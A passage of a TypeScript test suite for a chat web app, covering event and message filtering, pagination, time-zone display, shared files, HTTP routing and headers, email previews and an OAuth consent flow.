  assert.equal(events(page), 5)
  assert.ok(page.includes('shared/f10/') && page.includes('shared/f14/') && !page.includes('shared/f15/') &&
    page.includes('page 1 of 1 · 5 events') && page.includes(`class="clear" href="${path}#activity-h"`) &&
    page.includes('value="2026-10-01T12:10"'), page)
  assert.ok((await b.page(path + '?from=2026-10-02T00:00')).includes('Nothing in that time range.'))
  page = await b.page(path + '?from=2026-10-01T12:20&to=2026-10-01T12:10')
  assert.ok(page.includes('The start is after the end.'))
  assert.equal(events(page), 25)
  assert.ok((await b.page(path + '?from=yesterday')).includes('Enter the start as a date and time'))
  // Filtered page links keep the filter.
  page = await b.page(path + '?from=2026-10-01T12:00')
  assert.ok(page.includes(`href="${path}?from=2026-10-01T12%3A00&amp;page=2#activity-h"`), page)
})

// Pages show times in the configured zone, and the activity filter reads its times in that zone too.
test('Eastern time', async () => {
  const at = new Date(Date.UTC(2026, 9, 12, 22, 30, 0)) // 18:30 EDT
  const s = newSite({ timeZone: 'America/New_York', t: newTestService({ start: at }) })
  const { b, acct } = s.signedIn('sam@example.com')
  const e = s.t.svc.createEther({ accountId: acct.id, clientId: '' }, 'Team')

  const page = await b.page('/e/' + e.id)
  assert.ok(page.includes('2026-10-12 18:30 EDT') && !page.includes('22:30'), page)
  // 18:00-18:45 Eastern holds the event; 22:00-22:45 (its UTC time) doesn't.
  assert.ok((await b.page('/e/' + e.id + '?from=2026-10-12T18:00&to=2026-10-12T18:45')).includes('created the ether'))
  assert.ok(!(await b.page('/e/' + e.id + '?from=2026-10-12T22:00&to=2026-10-12T22:45')).includes('created the ether'))
})

test('comms filters and pages', async () => {
  const t0 = new Date(Date.UTC(2026, 9, 1, 12, 0, 0))
  const s = newSite({ t: newTestService({ start: t0 }) })
  const { b, acct: owner } = s.signedIn('owner@example.com')
  const { acct: sam } = s.signedIn('sam@example.com')
  const oa: Actor = { accountId: owner.id, clientId: 'test' }
  const sa: Actor = { accountId: sam.id, clientId: 'test' }
  const e = s.t.svc.createEther(oa, 'Team')
  s.t.join(oa, sa, e.id, 'sam@example.com')
  // Requests at 12:01..12:07: odd ones ask sam, even ones ask owner (asked by sam).
  for (let i = 1; i <= 7; i++) {
    s.t.set(new Date(t0.getTime() + i * minute))
    const [who, to] = i % 2 === 0 ? [sa, 'owner'] : [oa, 'sam']
    s.t.svc.ask(who, e.id, { to: [to], title: i === 3 ? 'Which kernel trick?' : 'Question ' + i })
    if (i === 5) { // owner's agent has five open now; answer one so there's room
      const rq = s.t.svc.listRequests(sa, e.id).find((r) => r.waitingOn(sam.id))
      if (rq) s.t.svc.answerRequest(sa, e.id, rq.id, -1, 'done')
    }
  }
  // Messages at 13:01..13:07, alternating fyi (owner) and update (sam).
  for (let i = 1; i <= 7; i++) {
    s.t.set(new Date(t0.getTime() + hour + i * minute))
    const [who, intent] = i % 2 === 0 ? [sa, 'update'] : [oa, 'fyi']
    s.t.svc.postMessage(who, e.id, { intent, title: 'Post ' + i, body: 'body ' + i })
  }
  const path = '/e/' + e.id + '/comms'
  const requests = (page: string) => page.split('<li id="r-').length - 1
  const messages = (page: string) => page.split('<li id="p-').length - 1

  let page = await b.page(path)
  assert.equal(requests(page), 5)
  assert.equal(messages(page), 5)
  assert.equal(page.split('page 1 of 2 · 7 in all').length - 1, 2)
  page = await b.page(path + '?r_page=2')
  assert.equal(requests(page), 2)
  assert.equal(messages(page), 5)
  // One page still shows the arrows, both dimmed.
  page = await b.page(path + '?r_who=sam')
  assert.equal(requests(page), 4)
  assert.ok(page.includes('<option value="sam" selected>@sam</option>'))
  assert.match(page, /arrow off"[^>]*>←<\/span>\s*<span class="meta">page 1 of 1 · 4 in all<\/span>\s*<span class="arrow off"/)
  page = await b.page(path + '?r_q=KERNEL')
  assert.equal(requests(page), 1)
  assert.ok(page.includes('Which kernel trick?'))
  assert.equal(requests(await b.page(path + '?r_q=done')), 1, 'search in answers')
  assert.equal(requests(await b.page(path + '?r_from=2026-10-01T12:02&r_to=2026-10-01T12:03')), 2)

  // Messages by tag and author; the requests' filter rides along.
  page = await b.page(path + '?m_tag=fyi&r_who=sam')
  assert.equal(messages(page), 4)
  assert.equal(requests(page), 4)
  assert.ok(page.includes('<input type="hidden" name="m_tag" value="fyi">') && page.includes('<input type="hidden" name="r_who" value="sam">'), page)
  page = await b.page(path + '?m_who=sam&m_q=body%206')
  assert.equal(messages(page), 1)
  assert.ok(page.includes('Post 6'))
  // Clearing one list's filter keeps the other's.
  page = await b.page(path + '?m_tag=fyi&r_who=sam')
  assert.ok(page.includes(`href="${path}?r_who=sam#messages-h">clear</a>`) && page.includes(`href="${path}?m_tag=fyi#requests-h">clear</a>`), page)
})

test('shared files list', async () => {
  const s = newSite()
  const { b, acct: owner } = s.signedIn('owner@example.com')
  const { acct: sam } = s.signedIn('sam@example.com')
  const oa: Actor = { accountId: owner.id, clientId: 'test' }
  const sa: Actor = { accountId: sam.id, clientId: 'test' }
  const e = s.t.svc.createEther(oa, 'Team')
  s.t.join(oa, sa, e.id, 'sam@example.com')
  for (let i = 1; i <= 12; i++) { // 8 by owner at the top, 4 by sam in slides/
    const [who, p] = i > 8 ? [sa, `shared/slides/week-${i}.md`] : [oa, `shared/notes-${String(i).padStart(2, '0')}.md`]
    s.t.svc.writeFile(who, e.id, p, 'x', 0)
  }
  const path = '/e/' + e.id + '/shared'
  const files = (page: string) => page.split('/f/shared/').length - 1

  let page = await b.page(path)
  assert.equal(files(page), 10)
  assert.ok(page.includes('page 1 of 2 · 12 in all') && page.includes('<span class="dir">slides/</span>week-10.md'), page)
  assert.equal(files(await b.page(path + '?f_page=2')), 2)
  assert.equal(files(await b.page(path + '?f_who=sam')), 4)
  assert.equal(files(await b.page(path + '?f_q=NOTES-0')), 8)
  // A breadcrumb to a folder opens the list filtered to it.
  page = await b.page('/e/' + e.id + '/f/shared/slides/week-9.md')
  const link = path + '?f_in=shared%2Fslides#files-h'
  assert.ok(page.includes(`<a class="back" href="${link}">← Back</a>`) && page.includes(`<a href="${link}">slides</a>`), page)
  page = await b.page(path + '?f_in=shared%2Fslides')
  assert.equal(files(page), 4)
  assert.ok(page.includes('<span class="chip">in shared/slides/</span>'))
})

// The parts of Go's ServeMux and net/http the site relies on.
test('static files, unknown paths, methods and canonical paths', async () => {
  const s = newSite()
  const b = s.browser()

  const css = await b.do('GET', '/static/style.css')
  assert.equal(css.status, 200)
  assert.equal(css.headers.get('Content-Type'), 'text/css; charset=utf-8')
  assert.equal(css.headers.get('Cache-Control'), 'public, max-age=31536000, immutable')
  const landing = await b.page('/')
  const href = /<link rel="stylesheet" href="(\/static\/style\.css\?v=([0-9a-f]{12}))">/.exec(landing)
  assert.ok(href, 'stylesheet link')
  assert.equal(href[2], createHash('sha256').update(await css.text()).digest('hex').slice(0, 12))

  let resp = await b.do('GET', '/robots.txt')
  assert.equal(await resp.text(), 'User-agent: *\nDisallow: /\n')
  resp = await b.do('GET', '/favicon.ico')
  assert.equal(resp.status, 204)
  assert.equal(resp.headers.get('Cache-Control'), 'public, max-age=86400')

  resp = await b.do('GET', '/nope')
  assert.equal(resp.status, 404)
  assert.equal(await resp.text(), '404 page not found\n')
  assert.equal(resp.headers.get('Content-Security-Policy')?.startsWith("default-src 'none'"), true)
  assert.equal(resp.headers.get('Cache-Control'), 'no-store')

  resp = await b.do('GET', '/logout')
  assert.equal(resp.status, 405)
  assert.equal(resp.headers.get('Allow'), 'POST')
  assert.equal(await resp.text(), 'Method Not Allowed\n')
  resp = await b.do('POST', '/e/abc', {})
  assert.equal(resp.status, 405)
  assert.equal(resp.headers.get('Allow'), 'GET, HEAD')
  assert.equal((await b.do('HEAD', '/login')).status, 200)
  assert.equal((await b.do('GET', '/dev/mail/')).status, 404, 'previews are off')

  resp = await b.do('GET', '/e//abc?x=1')
  assert.equal(resp.status, 307)
  assert.equal(resp.headers.get('Location'), '/e/abc?x=1')
  resp = await b.do('GET', '/e/abc/f')
  assert.equal(resp.status, 307)
  assert.equal(resp.headers.get('Location'), '/e/abc/f/')

  // A redirect to sign in, as Go writes it for a GET.
  resp = await b.do('GET', '/account')
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), '/login?next=%2Faccount')
  assert.equal(resp.headers.get('Content-Type'), 'text/html; charset=utf-8')
  assert.equal(await resp.text(), '<a href="/login?next=%2Faccount">See Other</a>.\n\n')
})

test('email previews, when enabled', async () => {
  const t = newTestService()
  const mail = new CaptureMailer()
  const app = createWebApp({
    ethers: t.svc, auth: new AuthService(t.db, t.svc, mail, t.pepper, discardLogger), mailer: mail,
    baseUrl: 'https://etherchat.test', log: discardLogger, mailPreviews: true, allowCommand: '', timeZone: 'UTC',
  })
  const index = await (await app.request('/dev/mail/')).text()
  assert.ok(index.startsWith('<!doctype html><title>Email previews</title><h1>Email previews</h1><ul>'))
  const name = /href="\/dev\/mail\/([^"]+\.html)"/.exec(index)?.[1]
  assert.ok(name)
  const resp = await app.request('/dev/mail/' + name)
  assert.equal(resp.status, 200)
  assert.equal(resp.headers.get('Content-Security-Policy'), "default-src 'none'; style-src 'unsafe-inline'; frame-ancestors 'none'")
  assert.equal((await app.request('/dev/mail/nope.html')).status, 404)
})

test('OAuth consent', async () => {
  const t = newTestService({ start: new Date() })
  const fetcher = { fetchJson: async () => { throw new Error('no network in tests') } }
  const oauth = new OAuthServer(t.db, t.svc, 'https://etherchat.test', fetcher, discardLogger)
  oauth.setClock(t.clock)
  const s = newSite({ t, oauth })

  // Register an app the way MCP clients do.
  const { Hono } = await import('hono')
  const api = new Hono()
  oauth.routes(api)
  const reg = await api.request('/oauth/register', {
    method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ redirect_uris: ['https://app.example/callback'], client_name: 'Test <App>', token_endpoint_auth_method: 'none' }),
  })
  const clientId = ((await reg.json()) as { client_id: string }).client_id
  const params = new URLSearchParams({
    client_id: clientId, redirect_uri: 'https://app.example/callback', response_type: 'code', state: 'xyz',
    code_challenge: 'E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM', code_challenge_method: 'S256', scope: 'ether',
  })
  const authorize = '/oauth/authorize?' + params.toString()

  // Signed out: sign in first, then come back.
  let resp = await s.browser().do('GET', authorize)
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), '/login?next=' + encodeURIComponent(authorize))

  const { b } = s.signedIn('sam@example.com')
  resp = await b.do('GET', authorize)
  const page = await resp.text()
  assert.equal(resp.status, 200)
  assert.equal(resp.headers.get('Content-Security-Policy'),
    "default-src 'none'; style-src 'self'; img-src 'self'; form-action 'self' https://app.example; frame-ancestors 'none'; base-uri 'none'")
  assert.ok(page.includes('<h1>Connect Test &lt;App&gt;?</h1>') && page.includes('<dt>returns you to</dt><dd>app.example</dd>'), page)
  assert.ok(page.includes(`<input type="hidden" name="client_id" value="${clientId}">`) && page.includes('name="state" value="xyz"'), page)

  // A bad request shows an error here instead of going back to the app.
  resp = await b.do('GET', authorize.replace('callback', 'elsewhere'))
  assert.equal(resp.status, 400)
  assert.ok((await resp.text()).includes('Can&#39;t connect this app'))

  const form: Form = Object.fromEntries(params)
  resp = await b.do('POST', '/oauth/authorize', { ...form, decision: 'deny' }, origin)
  assert.equal(resp.status, 303)
  assert.ok(resp.headers.get('Location')?.startsWith('https://app.example/callback?error=access_denied'))
  resp = await b.do('POST', '/oauth/authorize', { ...form, decision: 'allow' }, origin)
  assert.equal(resp.status, 303)
  const to = new URL(resp.headers.get('Location') ?? '')
  assert.equal(to.origin + to.pathname, 'https://app.example/callback')
  assert.ok(to.searchParams.get('code')?.startsWith('eth_ac_'))
  assert.equal(to.searchParams.get('state'), 'xyz')

  // Posting while signed out goes through sign-in, keeping the request.
  resp = await s.browser().do('POST', '/oauth/authorize', { ...form, decision: 'allow' }, origin)
  assert.equal(resp.status, 303)
  assert.ok(resp.headers.get('Location')?.startsWith('/login?next=%2Foauth%2Fauthorize%3F'))
})
